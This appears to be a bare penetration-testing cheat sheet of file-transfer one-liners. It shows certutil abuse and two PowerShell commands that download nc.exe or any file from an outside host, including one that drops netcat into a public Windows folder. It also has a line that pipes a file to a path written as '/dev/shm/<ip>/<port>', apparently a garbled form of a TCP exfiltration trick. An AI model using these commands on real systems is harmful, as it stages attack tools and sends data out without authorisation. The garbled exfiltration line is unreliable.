
```bash

certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe

```

```bash

cat file-name | /dev/shm/<ip>/<port>

```


```powershell

(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')

```

```powershell-session
Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe" 
```